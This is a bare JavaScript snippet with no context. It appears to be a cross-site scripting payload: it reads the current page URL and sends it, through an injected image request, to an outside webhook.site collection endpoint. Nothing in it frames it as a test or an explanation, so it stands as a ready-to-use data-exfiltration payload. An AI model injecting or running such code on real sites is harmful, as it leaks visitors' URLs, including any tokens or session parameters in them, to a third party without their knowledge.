var img = document.createElement("img");

var data = window.location.href;
console.log(JSON.stringify(data));
img.src="https://webhook.site/4d5de934-a8c5-4c46-9e2e-0377f5ba5c76/a.png?data="+data;
document.body.appendChild(img);
